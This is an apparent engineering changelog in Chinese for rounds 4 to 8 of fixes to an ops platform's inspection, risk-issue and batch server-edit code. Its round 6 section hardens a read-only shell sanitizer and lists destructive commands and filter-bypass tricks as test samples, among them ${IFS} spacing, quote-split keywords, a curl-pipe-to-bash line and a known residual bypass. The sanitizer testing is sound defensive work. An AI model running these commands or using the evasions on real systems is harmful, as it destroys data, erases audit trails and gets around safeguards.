| `ops.upload_package`（`content_base64` + `dry_run=true`） | HTTP 200；`dry_run=true`、`staged=false`、`size=32`；文件中心无该包、`data/uploads` 无落盘、`DeployPackage` 计数 14 → 14 |
| `ops.prepare_release_from_local_package`（`content_base64` + `dry_run=true`） | HTTP 200；返回真实预检（`size=32`），未落盘 |
| 高危写工具夹带 `dry_run`（`ops.execute_deploy_plan`） | 缺 `confirm_text` → 400；补上确认短语但夹带 `dry_run` → `400 Unknown tool arguments: dry_run` |
| 全量测试套件 | `pytest tests/ -q` → **1364 passed**（第 3 轮 1348 + 本轮新增 16） |

> 运维提示：本轮修复只改后端（工具适配器 + 风险策略），**需要重启 OPS 才生效**；
> 前端无改动，无需强制刷新。`/api/v2/tools/call` 的响应若出现 `private_key: "***"`，
> 属预期脱敏；若需要辨识"某台服务器用了哪把钥匙"，请使用 `private_key_fingerprint`。

## 第 5 轮（2026-09-12）

本轮范围：**巡检域**（`app/services/inspection_center.py` 6100 行）的时间窗、状态机与任务生命周期。

### 一、已修复

#### 5.1 【中危】未知 `period` 让巡检台账/报表/删除接口直接 500

- **缺陷**：`_period_bounds()` 的最后兜底分支写成
  `start = now.replace(...); return start, end, "daily"`，但该路径下 `end` **从未赋值**
  （只在 daily/weekly/monthly 与显式日期分支赋值）→ `UnboundLocalError`。
  而 API 层 `period: str = "daily"` 是**未校验的字符串**，前端只发 daily/weekly/monthly，
  所以从 UI 点不到、从接口/AI 客户端一调就炸。
- **现场复现（修复前）**：
  `GET /api/v2/inspection/ledger?period=daily` → 200；
  `GET /api/v2/inspection/ledger?period=quarterly` → **HTTP 500 Internal server error**
  （函数级：`UnboundLocalError: cannot access local variable 'end' where it is not associated with a value`）。
  受影响入口：台账 `GET /inspection/ledger`、报表预览 `GET /inspection/reports/periodic-preview`、
  周期报表 `POST /inspection/reports/periodic`、历史删除 `DELETE/POST /inspection/ledger*`
  （删除路径在崩溃点之前就中断，未造成误删）。
- **修复**：兜底分支显式 `return start, now, "daily"`；`period` 归一化时补 `.strip()`
  （`"DAILY "` 之类也能正确归一）。`"quarterly"`/`"7d"` 等未知值按既有设计意图
  兜底为"今日"，并在响应 `summary.period` 中回显归一结果，调用方可感知。
- **回归**：`tests/test_inspection_period_window.py`（23 项）。
- **红灯证据**：修复前 11 项失败，包含 `inspection_center.py:5059 UnboundLocalError`
  经 `inspection_ledger` 与 `delete_inspection_history` 两条路径抛出。

#### 5.2 【低-中】带时区偏移的日期入参按 UTC 归一（此前被当成 UTC 直接使用）

- **缺陷**：`_parse_dt()` 对 `2026-09-10T08:00:00+08:00` 这类带偏移的字符串执行
  `.replace(tzinfo=None)`，**丢掉偏移而不换算**，日期窗整体偏移 8 小时
  （与全仓"持久化时间统一为 naive UTC"的约定不符；`Z` 结尾的串处理是对的，所以问题只在非 UTC 偏移）。
- **修复**：`datetime` 对象与字符串两条路径都改为 `astimezone(timezone.utc).replace(tzinfo=None)`。
- **回归**：同上文件中的 `test_parse_dt_normalizes_offset_to_utc`。

#### 5.3 【中危】巡检任务会永久停在"执行中"（无收尾、无回收）

- **缺陷**：`create_server_inspection_run` / `create_project_inspection_run` 建库时状态**直接就是
  `RUNNING`**，但执行链路上存在多条"未收尾就退出"的路径，且全仓**没有任何僵尸回收逻辑**：

  | 路径 | 中断原因 | 修复前行为 |
  | --- | --- | --- |
  | `execute_server_inspection_run` | `db.query(...)`（读 run 行）、`_load_thresholds(db)` 在 `try` **之外**，SQLite 并发下 `database is locked` 即冒泡 | run 留 RUNNING |
  | `execute_project_inspection_run` | `_get_project_with_relations(db, pid)` 在 `try` 之外 | run 留 RUNNING |
  | `execute_server_inspection_runs_batch` | worker 抛错只写进返回值的 `errors` 列表，**不写库** | 调用方看到"失败 N 台"，历史里仍"执行中" |
  | `_run_one_server_in_new_session` | 批量同步接口 worker 抛错直接冒泡 | run 留 RUNNING |
  | `api/inspection.py::_run_servers_batch_background` | **完全没有 try/except**；`/servers/batch-start` 预建的一批 RUNNING run 在入口整体失败时全部变僵尸 | N 台全部留 RUNNING |
  | 后端进程重启/部署 | 执行是进程内 `BackgroundTasks`/线程池，重启即中断 | 无任何机制回收 |

- **影响**：概览页/历史页永久显示"执行中"，`running_runs` 进度条永远挂在那里，
  运维无法区分"真的在跑"和"残骸"。
- **修复**（四层）：
  1. 新增 `mark_run_failed(db, run_id, message)`：**幂等**、只对 RUNNING/PENDING 生效
     （不覆盖已终结结果），当前会话损坏时自动降级用独立 `SessionLocal()` 写入；
  2. 两个执行器把 `db.query`/`_load_thresholds`/`_get_project_with_relations` 全部纳入
     `try`，任一步失败都走 `mark_run_failed`；`_append_progress` 写入失败不再掩盖原始异常；
  3. 批量 worker（`execute_server_inspection_runs_batch` / `_run_one_server_in_new_session`）
     失败时按 `run_id` 收尾；API 层三个后台包装函数也补兜底，覆盖"批量入口整体失败"；
  4. 新增 `reap_stale_inspection_runs()` 自愈回收器，在概览读取（`_running_runs_with_progress`）时
     先回收僵尸：**同时**满足"自身超过 `INSPECTION_STALE_RUN_SECONDS`（默认 90 分钟）未更新"
     且"最近 `INSPECTION_ACTIVE_HEARTBEAT_SECONDS`（默认 5 分钟）内整个巡检域没有任何 run 推进"
     才判定为僵尸——心跳门控保证批量**排队中**的 run 不会被误杀（同批只要还有 run 在推进就不回收）。
- **回归**：`tests/test_inspection_run_lifecycle.py`（12 项：执行器失败收尾、批量 worker 收尾、
  `mark_run_failed` 幂等/不覆盖终结态/独立会话兜底、回收器正例与三类不误杀、概览自愈）。
- **红灯证据**（暂存源码后）：执行器两个用例以 `RuntimeError: simulated ...` 直接冒泡；
  批量 worker 用例 `AssertionError: assert 'RUNNING' == 'FAILED'`；
  单机 worker 用例 `AssertionError: ['RUNNING']`。

### 二、已排除的"假问题"（本轮审计结论，避免误修）

| 审计项 | 结论 | 证据 |
| --- | --- | --- |
| `_aggregate_risk_counts` 按 `(server, category)` 取最高风险后再计数 | **有意设计**，与 `_compute_score` 的"按机器数平均扣分"公式配套 | 函数 docstring 的 P1-5 说明 + `tests/test_inspection_scoring.py` 20 项通过 |
| 批量 `start` 预先把整批 run 建成 RUNNING | **有意设计**：让前端立即看到批次；本轮只补"失败必收尾 + 僵尸回收" | `api/inspection.py:377-385` |
| `overview` 的未闭环问题计数 | 走聚合查询，与列表 `status=OPEN,PROCESSING` 的 total 一致（沿用第 1 轮结论） | `tests/test_inspection_issue_count_contract.py` 4 项通过 |
| 台账/删除的 5000 行上限 | 有意的保护性上限，`total` 仍用 `count()` 不受列表分页影响 | `inspection_center.py:5135/5139/6080` |
| `period=''`、大小写、别名（day/week/month） | 归一化正确（本轮补了 `.strip()`） | `test_known_periods_normalize` 8 组参数 |
| 生产是否存在历史僵尸 | **没有**：修复前实测 4 条 run 全为 SUCCESS，0 条 RUNNING/PENDING | 只读查询 + 现场实测 |
| `retention`/报告生成链路是否受本轮改动影响 | 未受影响：本轮只改执行收尾与时间窗，报告生成复用 `report_center` | 全量套件 1399 passed |

### 三、待办（后续轮次）

- 巡检域剩余：分析器阈值边界的业务正确性（`_analyze_*` 共 20+ 个，本轮未逐个复核业务口径）、
  自定义规则执行器的注入面复核（`_sanitize_rule_shell` 已存在，需验证绕过可能）。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性。
- 剩余 `except: pass` 静默失败分诊（约 142 处，巡检域已发现 `inspection_periodic_report_payload` 吞掉明细异常）。
- MCP 工具描述正向漂移批量校准；批量改 `auth_type` 时不校验新认证方式凭据。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 5 轮可复现的验证脚本

- `tests/test_inspection_period_window.py`：23 项时间窗（未知周期兜底、别名归一、区间边界、UTC 归一）；
- `tests/test_inspection_run_lifecycle.py`：12 项任务生命周期（收尾幂等 + 僵尸回收不误杀）；
- `fnos-migration/_verify_round5_fixes.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 15088；16 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| `GET /api/v2/inspection/ledger?period=quarterly` | **HTTP 200**（修复前 500），`summary.period="daily"` |
| `GET /api/v2/inspection/reports/periodic-preview?period=7d` | HTTP 200（修复前 500） |
| `GET /inspection/ledger?date_from=2026-09-10T08:00:00+08:00` | HTTP 200，`summary.date_from="2026-09-10T00:00:00"`（偏移已按 UTC 归一） |
| `period=daily/weekly/monthly` | 全部 HTTP 200（既有行为未回归） |
| 插入 3 小时未更新的 RUNNING 探针 run → `GET /api/v2/inspection/overview` | 该 run 被自动标记 **FAILED**，写入 `finished_at`，摘要为"巡检执行中断（后端进程重启或后台任务异常）…"，且不再出现在 `running_runs` |
| 回收前后历史数据 | run 总数 4 → 4，状态全部保持 `SUCCESS`（未误伤） |
| 探针清理 | 删除后残留 0 |
| 全量测试套件 | `pytest tests/ -q` → **1399 passed**（第 4 轮 1364 + 本轮新增 35） |

> 运维提示：本轮同样只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
> 若批量巡检规模很大且把 `run_timeout_seconds` 调得很高，排队中的 run 可能长时间没有自身进度，
> 此时心跳门控仍能防止误回收（同批有 run 在推进即可）；只有在**执行器进程整体停摆**时才会回收，
> 可通过 `INSPECTION_STALE_RUN_SECONDS` 调整判定窗口。

## 第 6 轮（2026-09-12）

本轮范围：**巡检规则只读安全策略的一致性**（自定义 shell 规则的两条执行路径 + 黑名单强度）。

### 一、已修复

#### 6.1 【中危】项目组合巡检绕过只读策略，直接执行自定义规则原文

- **缺陷**：自定义规则命令有两条执行路径，但只有一条做安全校验：

  | 路径 | 入口 | 是否过净化器 |
  | --- | --- | --- |
  | A 单机 / 批量 / 方案巡检 | `execute_server_inspection_run` → `_rule_execution_specs` | ✅ 命中即 `blocked_reason`，不执行 |
  | B 项目组合巡检 | `POST /api/v2/inspection/projects/{id}/combined-run` → `_server_checkers` → `_server_check_specs` → `_build_custom_rule_spec` → `_spec_from_rule_code` | ❌ 不调用净化器，也不看 `blocked_reason`，直接 `_remote_check` 下发 |

  结果是同一条 `systemctl stop nginx` 自定义规则：在单机/批量/方案巡检里被拦，
  在项目组合巡检里**真的在目标服务器上执行**——同一个"只读巡检"承诺出现绕过。
- **修复**：`_spec_from_rule_code` 统一调用 `_sanitize_rule_shell` 并写入 `blocked_reason`；
  `_server_checkers` 对带 `blocked_reason` 的 spec 走 `_blocked_rule_result`（状态 `SKIPPED`）而不下发命令。
- **红灯证据**：`AssertionError: 被拦规则不应执行：'systemctl stop nginx\nrm -rf /data'`
  （`_remote_check` 被真实调用），以及组合巡检 spec 缺 `blocked_reason` 的 `KeyError`。
- **部署后实测**：模块探针规则（`systemctl stop nginx`）在 B 路径 `blocked_reason` 命中、
  A 路径同样命中；只读探针规则两条路径均放行。

#### 6.2 【中危】黑名单本身强度不足：13/24 破坏性写法可绕过，且已有误拦

净化器是"只读巡检"的唯一运行时防线，本轮实测其实际强度（24 个样本）：

| 类别 | 修复前 | 修复后 |
| --- | --- | --- |
| 破坏性样本被拦 | **11/24**（`rm -rf`、`chmod -R`、`dd of=`、`> /etc/`、`systemctl stop`、DML、`bash -c rm`、…） | **24/24** |
| 破坏性样本漏网 | **13/24**（详见下表） | 0 |
| 只读样本误拦 | **1/16**（`grep -E 'systemctl stop' /var/log/messages` 这类只读日志搜索被误杀） | 0 |

修复前漏网样本（实测全部放行 ✗）：

| 漏网写法 | 危害 | 原因 |
| --- | --- | --- |
| `rm /data/important.txt` | 删除文件 | 原正则要求 `rm` 后必须跟 `-` 参数 |
| `find /data -delete` | 批量删除 | 未覆盖 `-delete` |
| `sed -i s/a/b/ /etc/hosts` | 就地改写配置 | 未覆盖 `-i` |
| `truncate -s 0 /var/log/syslog` | 清空日志 | 未覆盖 |
| `crontab -r` / `history -c` | 清空定时任务 / 审计线索 | 未覆盖 |
| `userdel ops` / `passwd ops` | 删号 / 改密 | 未覆盖 |
| `mount -o remount,rw /` / `umount /data` | 重新挂载可写 / 卸载 | 未覆盖 |
| `systemctl st"op" nginx`、`systemctl 'stop' nginx` | 停服务 | 关键字被引号拆分，正则按字面匹配 |
| `rm${IFS}-rf /data` | 删除 | `${IFS}` 充当空格绕过 `\s+` |
| `curl http://x/y.sh \| bash` | 下载即执行 | 未覆盖管道执行 |
| `python3 -c "import shutil;shutil.rmtree('/data')"` | 任意破坏 | 未覆盖解释器一行式 |

- **修复**：
  1. 扫描前做**归一化**（不改下发命令）：`$IFS`/`${IFS}` → 空格，去掉引号与反斜杠
     → 封堵 `st"op"`、`rebo\ot`、`rm${IFS}-rf` 这类纯语法绕过；
  2. 补齐上述破坏性写法；每条规则都要求"命令词 + 参数"，避免误伤只读用法。
- **零误拦验证**（关键安全网）：加固后 19 条内置规则、12 个内置巡检项命令**全部仍放行**；
  收尾过程中曾因"一刀切拦 `find -exec`"与"未要求管道前空白"误拦 4 条内置规则
  （`find … -exec tail`、`find … -exec sha256sum`、`ps -ef | egrep a|b|c|python|node …`），
  已据此把规则收紧为 `-exec <破坏性命令>` 与 `\s\|\s*(python|node|sh|…)`，
  并把这组"内置规则/命令永不被拦"固化为回归测试。
- **局限（明确写入 docstring，非安全边界）**：黑名单只能拦住"明显破坏性"写法，
  无法证明一条规则真的只读。真正的边界是"谁能编写规则"（管理端 + 审计）。
  已知残留：管道前无空格的 `curl x|bash` 不拦（换取不误伤 `egrep a|b|sh` 这类只读交替）。

#### 6.3 【低-中】命令存于 `config.commands` 的规则在组合巡检里被静默跳过

- **缺陷**：`_rule_execution_specs` 支持 `rule_content` **或** `config.commands/shell/cmd`
  两种命令来源，而组合巡检路径的 `_spec_from_rule_code` 只读 `rule_content`：
  这类规则在组合巡检里**连一条结果行都不产生**（既无失败也无跳过），运维无从发现。
- **修复**：`_spec_from_rule_code` 补上同一套 config 命令回退，再统一过净化器。
- **红灯证据**：`AssertionError: config.commands 形式的规则不得被静默跳过 / assert 0 == 1`。

#### 6.4 【低-中】同一分类挂多条规则时，组合巡检只执行第一条

- **缺陷**：`_build_custom_rule_spec` 用 `.order_by(sort_order).first()` 只取一条，
  而 `_server_check_specs` 每个分类只 append 一个 spec；主路径 `_rule_execution_specs`
  却是"该分类下全部规则"。一个巡检项挂 2 条规则时：
  组合巡检跑 1 条、单机/批量跑 2 条，另一条被静默丢弃。
- **修复**：新增 `_build_custom_rule_specs()`（按 `sort_order` 收集 `InspectionItemRule`
  全部关联 + 该分类全部启用规则并去重，逐条构建 spec），`_server_check_specs` 改为 extend；
  `_build_custom_rule_spec` 保留为"取第一条"的兼容包装。
- **红灯证据**：`AssertionError: 组合巡检 1 条 vs 单机/批量 2 条 / assert 1 == 2`。

#### 6.5 规则接口新增 `command_policy`（作者侧可见，含内置规则）

- 规则写路径（`create_rule`/`update_rule`）此前**只校验 `risk_level`/`scope_type`，完全不校验
  `rule_content`**，作者无法预知自己的规则会不会在执行时被跳过。
- 现在 `GET/POST/PATCH /inspection/rules` 的每条规则（含 16 条未落库的内置规则）都返回
  `command_policy: {readonly_allowed, reason}`，与执行时的判定共用同一实现
  （`_rule_command_policy` → `_sanitize_rule_shell`），`readonly_allowed=false` 即在执行时会被跳过。
- **连带风险已处理**：`command_policy` 是展示字段，`_builtin_rule_by_code` 的
  "剔除非模型字段"名单同步加入该键，否则编辑内置规则时
  `InspectionRule(**base)` 会 `TypeError`；已补回归用例
  `test_builtin_rule_can_still_be_materialized`。

### 二、已排除 / 记录（本轮审计结论，避免误修）

| 审计项 | 结论 |
| --- | --- |
| 是否已有"执行任意命令"的 MCP 工具绕过巡检策略 | **没有**：`app/services/tool_adapters/` 下无通用命令执行适配器；工具层最高风险写入工具均带确认闸门（第 4 轮结论） |
| 画像 / 问题重试路径是否也绕过策略 | 未绕过：`inspection_profiles.run_profile` / `run_issue_retry` 都走 `run_servers_batch_inspection` → 净化路径 |
| 项目侧规则路径（`_project_rule_check_specs`） | 复用 `_rule_execution_specs`，本就净化 ✅ |
| `app/services/inspection.py` | **死模块**（全仓无调用方，仅硬编码只读命令），存在同样的净化缺失但不可达，本轮不改，仅记录 |
| `find`/`grep`/`ps` 等只读统计写法 | 全部保留放行（含 `find -printf/-ls/-exec tail`、`ps -ef \| egrep a\|b\|c`），已固化为测试 |

### 三、待办（后续轮次）

- 巡检域剩余：20+ 个 analyzer 的业务判定口径逐个复核（本轮只覆盖策略与执行路径）。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性；批量改 `auth_type` 不校验新凭据。
- 剩余 `except: pass` 静默失败分诊（巡检域已见 `inspection_periodic_report_payload` 吞掉明细异常）。
- MCP 工具描述正向漂移批量校准；`update_issue` 状态机（重开时 `fixed_at`/`verified_at` 残留）。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 6 轮可复现的验证脚本

- `tests/test_inspection_rule_policy_scope.py`（57 项）：两路径判定一致、被拦规则不下发、
  多规则分类全部执行、config 命令来源、净化器双向表驱动（24 破坏 + 19 只读）、内置规则零误拦；
- `fnos-migration/_verify_round6_sanitizer.py`（未入库）：内置规则/命令零误拦 + 绕过样本收敛；
- `fnos-migration/_verify_round6_rules.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 20584；18 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| `GET /api/v2/inspection/rules` | HTTP 200，**19/19** 条规则都带 `command_policy`，内置规则全部 `readonly_allowed=true` |
| `POST /inspection/rules`（`systemctl stop nginx` 探针） | HTTP 200，返回 `readonly_allowed=false` + 拦截原因（策略在执行时拦截，不在写入时拒绝新规则） |
| `POST /inspection/rules`（`df -PTh` 探针） | HTTP 200，返回 `readonly_allowed=true` |
| 服务层 A 路径（`_rule_execution_specs`） | 危险探针命中 `blocked_reason`；只读探针放行 |
| 服务层 B 路径（`_server_check_specs`，即组合巡检） | 危险探针命中 `blocked_reason`（修复前会下发执行）；只读探针放行；同分类 2 条规则均生成 spec |
| 生产数据复原 | 规则 3→3、巡检项配置 16→16、巡检项关联 17→17，无残留探针；接口可见 19→19 条 |
| 全量测试套件 | `pytest tests/ -q` → **1456 passed**（第 5 轮 1399 + 本轮新增 57） |

> 运维提示：本轮只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
> 规则编辑器可读取 `command_policy.readonly_allowed` 提前给出"该规则执行时会被跳过"的提示；
> 该字段缺失时（老客户端）行为不变，规则照旧在执行时被拦截。

## 第 7 轮（2026-09-12）

本轮范围：**风险问题闭环生命周期**（状态机时间戳、截止时间写入路径、未闭环口径）。

### 一、已修复

#### 7.1 【中危】闭环时间戳与状态不自洽（详情页"闭环时间线"直接说谎）

`update_issue` 只在"进入 FIXED/VERIFIED"时写时间戳，**离开这些状态时不清空**，且直接
VERIFIED 不补 `fixed_at`。风险中心详情弹窗（`IssueDetailModal.tsx` 的"闭环时间线"）
直接展示这两列，因此出现四类矛盾数据：

| 操作序列 | 修复前 | 修复后 |
| --- | --- | --- |
| FIXED → 重开（OPEN/PROCESSING） | 状态"处理中"但**仍显示修复时间**，看起来已修好 | 两个时间戳清空 |
| 直接 VERIFIED（跳过 FIXED） | **有验证时间、无修复时间** | 自动补 `fixed_at`，两者成对 |
| FIXED → IGNORED | 仍保留修复时间 | 清空 |
| 重复提交同一状态 | `fixed_at`/`verified_at` 被**刷新**（改写闭环时长） | 保留首次发生时间 |

- **修复**：状态流转时按"时间戳只存在于 FIXED/VERIFIED"的不变量统一维护；
  重复提交同状态幂等（保留首次时间），FIXED↔VERIFIED 回退时按新状态重写。
- **红灯证据**：`AssertionError: 重开后不应保留修复时间 / assert ('2026-09-12T15:53:17.497869' is None)`、
  `验证时间存在时修复时间不得为空`、`重复 FIXED 不应刷新修复时间`。
- **部署后实测**：探针问题 FIXED（写入修复时间）→ 重复 FIXED（时间不变）→ VERIFIED（两者齐全）
  → 重开 PROCESSING（两者清空）全部符合预期。

#### 7.2 【中危】`deadline_at` 没有任何写入路径（"截止时间"永远是空）

排查确认：`deadline_at` 只有三处出现——模型列、序列化字段（`_issue_to_dict`）、前端展示列，
**全仓不存在任何写入点**。后果：详情页"截止时间"永远为 `-`；`ops.risk.triage` 描述里承诺的
"超期"维度永远无法触发（无数据可判）。

- **修复**：`UpdateIssuePayload` 增加 `deadline_at`（ISO8601，支持 `Z`/`+08:00`），
  服务层 `_parse_deadline_at` 解析：带时区统一转 **naive UTC**（与全平台持久化口径一致），
  空串表示清除，非法格式返回 400（不再静默忽略）。
- **红灯证据**：`assert None == '2026-10-01T12:00:00'`（写不进去）、
  `Failed: DID NOT RAISE`（非法值原本无从校验）。
- **部署后实测**：`2026-10-01T20:00:00+08:00` → 存为 `2026-10-01T12:00:00`；
  `2026/10/01` → HTTP 400；空串 → 清除为 `null`。

#### 7.3 【中危】`ops.risk.triage` 漏掉"处理中（PROCESSING）"风险，与全平台未闭环口径不一致

平台口径在四处明确写死为 **未闭环 = OPEN + PROCESSING**：
`overview.open_issue_count`（L5159-5161）、issue 列表 `status=OPEN,PROCESSING`（L5025-5026）、
看板/报表合计（L5189-5190、L5307）。但面向 AI/Agent 的 `ops.risk.triage`
（其自身描述也写着"未闭环 = status 传 OPEN,PROCESSING"）实际调用
`list_risks({"status": "OPEN"})` → **在办风险被排除在优先级建议之外**，
高危处理清单与总览数字不一致。

- **修复**：口径改为 `OPEN,PROCESSING`；同时兑现工具描述里承诺的**超期维度**
  （同等级内超期优先、条目新增 `overdue`/`status`/`deadline_at` 字段、摘要追加超期数量），
  并把描述中并未实现的"生产/重复"字样改为与实现一致的表述（避免描述正向漂移）。
- **红灯证据**：`AssertionError: PROCESSING（在办）风险必须进入分流清单`、
  `超期的高危应排在同级最前：['A 未超期', 'B 已超期', ...]`。
- **部署后实测**：生产未闭环 = 列表 `OPEN,PROCESSING` total **12** = `overview.open_issue_count` **12**
  （只算 OPEN 是 11，即修复前 triage 会报 11）；triage 摘要报"未闭环风险 12 个"，
  清单 12 条，状态集合 `['OPEN','PROCESSING']`，条目带 `overdue` 字段。

### 二、已排除 / 记录（本轮审计结论，避免误修）

| 审计项 | 结论 |
| --- | --- |
| `_aggregate_risk_counts` 的 `normal` 按行计数、而高/中/低按 `(server, category)` 去重 | **不是 BUG**：`tests/test_inspection_scoring.py::test_aggregate_normal_count` 明确锁定"normal = PASS 且 risk_level=NONE 的行数"语义（`normal_count` 展示的是正常项数，参与评分的只有高中低），本轮不改；仅作为口径说明记录 |
| AI/MCP 是否能改风险状态 | **不能**：`ops.risk.update_status`/`ops.risk.verify`/`ops.risk.ignore` 均为审批占位（恒返回 `requires_human_approval=true`），唯一写入路径是网页 PATCH → `update_issue`，本轮修复即覆盖全部消费者 |
| 风险问题自动建档 | 正常：`_save_result` 对 `risk_level∈{HIGH,MEDIUM,LOW}` 且 `status∈{RISK,WARNING,ERROR}` 建档；生产 20 条 item_result → 12 条风险项 → 12 条问题，逐条对得上 |
| `triage` 的"重复风险"维度 | 未实现（需标题相似度聚类），已从描述中移除，列为后续增强，非本轮缺陷 |
| `deadline_at` 的到期提醒/通知 | 无调度消费方（仅展示），本轮只补齐写入路径，不做通知 |

### 三、待办（后续轮次）

- 巡检域 20+ 个 analyzer 的业务判定口径逐个复核。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性；批量改 `auth_type` 不校验新凭据。
- 剩余 `except: pass` 静默失败分诊；`period` 等 API 参数校验。
- MCP 工具描述与 `mcp_capability_service.py` 能力目录的一致性巡检（两处描述来源易漂移）。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 7 轮可复现的验证脚本

- `tests/test_inspection_issue_lifecycle.py`（14 项）：状态机时间戳不变量、截止时间写入/清除/校验、
  triage 未闭环口径与超期排序；
- `fnos-migration/_verify_round7_issues.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 37260；20 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| 未闭环口径一致性 | 列表 `status=OPEN,PROCESSING` total = **12** = `overview.open_issue_count` **12**（只算 OPEN 为 11） |
| `ops.risk.triage` | 摘要"当前未闭环风险 **12** 个，建议优先处理 8 个高危风险。"，清单 12 条，状态集合 `['OPEN','PROCESSING']`，条目含 `overdue` |
| 探针问题状态机 | FIXED → 修复时间写入；重复 FIXED 时间不变；VERIFIED → 修复+验证齐全；重开 PROCESSING → 两者清空 |
| 截止时间 | `+08:00` 归一为 UTC `2026-10-01T12:00:00`；`2026/10/01` → **400**；空串 → `null` |
| 生产数据复原 | 探针问题删除后问题总数 12→12、总览未闭环 12→12、无残留 |
| 全量测试套件 | `pytest tests/ -q` → **1470 passed**（第 6 轮 1456 + 本轮新增 14） |

> 运维提示：本轮只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
> 前端风险中心已能设置截止时间（PATCH `deadline_at`）并看到 `overdue` 提示；
> 老客户端不传该字段时行为不变。

## 第 8 轮（2026-09-12）

本轮范围：**服务器连接配置的批量编辑**（字段覆盖、认证方式校验、端口校验、分组同步）。
四条缺陷同源：批量路径与单机路径行为不一致，且失败被静默吞掉。

### 一、已修复

#### 8.1 【中危】批量编辑"服务器状态"是静默空操作（界面提示成功，实际零改动）

前端批量弹窗有"服务器状态"下拉（在线/停用/离线，`ServerListPage.tsx:1716`），
`handleBatchSubmit` 会写入 `updates.status`（L576）；但后端 `PUT /servers/batch`
的字段分支里**没有 `status`**，`changed` 保持 False → 直接 `updated.append(name)`，
接口返回 `{"updated":["srv-a"],"failed":[]}`，界面提示"批量编辑完成 N 台成功"。

- **修复**：批量支持 `status`（并同步 `enabled = status != "disabled"`，与单机一致）；
  同时把"前端表单字段集 ⊆ 后端支持字段集"固化为测试，
  并让**未知字段一律 400**（`updates={"password": "x"}` 以前返回成功却什么都不做）。
- **红灯证据**：`AssertionError: assert 'online' == 'disabled'`；
  `AssertionError: {"success":true,...,"updated":["srv-a"],...}` 配 `assert 200 == 400`。

#### 8.2 【中危】切换 `auth_type` 不校验目标模式的凭据，且枚举值不受约束

单机创建会按 `auth_type` 校验凭据、单机更新会沿用既有凭据，而**批量路径直接把
`updates["auth_type"]` 写进 50 台以内所有服务器**：`key_file → password` 时若库里没有密码，
这些服务器从此永远连不通，接口还报成功。`auth_type` 本身也没有枚举校验——
生产 78 台里就有 1 台 `auth_type="key"`（既非 password/key_file/key_content）。

- **修复**：抽出 `_auth_credential_error()`（创建/单机更新/批量共用，文案统一），
  切换认证方式时若目标模式所需凭据缺失 → 该台进入 `failed` 并给出明确原因，不写坏配置；
  `_validate_auth_type()` 校验枚举（创建/批量/单机改新值均生效）。
  历史脏值处理：**既有非法值原样保留**（避免"只改描述"被存量数据卡住），
  但显式改成非法新值一律 400。
- **红灯证据**：`AssertionError: assert ['srv-a', 'srv-b'] == []`（无凭据也照改）；
  创建接口接受 `"auth_type":"key"` 返回 200。

#### 8.3 【低-中】批量 `port` 不做校验：非数字 → 整批 500，越界照样写库

`int(updates["port"])` 在循环内执行，`"abc"` 直接抛 `ValueError` → 整批 500，
而此前已保存的服务器无法回滚（部分成功无提示）；`port=0` 因真值判断被静默忽略，
`port=70000` 则被写入。

- **修复**：`_validate_port()` 统一校验（整数 + 1..65535），批量级参数**在循环前整体校验**
  （参数非法时不产生任何写入），单机更新同样使用。
- **红灯证据**：`ValueError: invalid literal for int() with base 10: 'abc'`；
  越界端口 `assert 200 == 400`。

#### 8.4 【中危】分组同步实际从未生效：未导入 `ServerGroup`，`NameError` 被 `except` 吞掉

单机更新尾部的 `server_groups.server_names` 同步块引用了 `ServerGroup`，
但模块只导入了 `Server & Service`——运行时 `hasattr(app.api.servers, "ServerGroup") is False`，
该段抛 `NameError` 后被同块的 `except Exception` 吞成一条 warning，**同步从未成功过**；
批量路径则完全没有这段逻辑。后果：改分组后分组视图仍是旧成员，
旧分组删除时因残留名单而 409（这段注释当初想解决的问题一直存在）。

- **修复**：模块级导入 `ServerGroup`，抽出 `_sync_server_group_membership()` 供
  单机与批量共用（批量每保存一台同步一台），异常不再静默，
  并在返回值里附带 `fields` 便于核对实际改动字段。
- **红灯证据**（日志实证）：
  `WARNING app.api.servers:servers.py:670 sync server_groups.server_names for 'srv-b' failed: name 'ServerGroup' is not defined`；
  批量改组后 `旧组应剔除 srv-a：{'old-group': ['srv-a', 'srv-b'], 'new-group': []}`。

### 二、已排除 / 记录（本轮审计结论，避免误修）

| 审计项 | 结论 |
| --- | --- |
| `ops.batch_update_servers` | 只存在于 `mcp_capability_service.py` 的**能力描述目录**，没有注册实现；批量编辑当前只能由网页管理端发起（管理员 + 高风险确认闸门），本轮据此按"仅前端调用"设计字段白名单 |
| 创建路径的脱敏占位符 | 第 3 轮已修：`blank_redacted_secrets()` 在创建入口调用；本轮继续复用同一校验器，未回退 |
| 批量是否支持改密码/密钥 | **有意不支持**：一次给 50 台写同一份凭据风险过高，且脱敏语义复杂；改为明确 400 并在报错里提示"逐台在编辑页修改"，杜绝"提示成功却没改" |
| 生产 78 台的凭据完整性 | 实测 0 台缺凭据（77 台 key_file 均有 key 路径）；仅 1 台历史 `auth_type="key"`，按 8.2 的兼容策略保留可编辑 |
| `jump_host` 内联（dict）批量写入 | 正常：`_server_dict_to_metadata` 会保留内联跳板机配置（含加密凭据），本轮未改动 |

### 三、待办（后续轮次）

- 巡检域 20+ 个 analyzer 的业务判定口径逐个复核。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性。
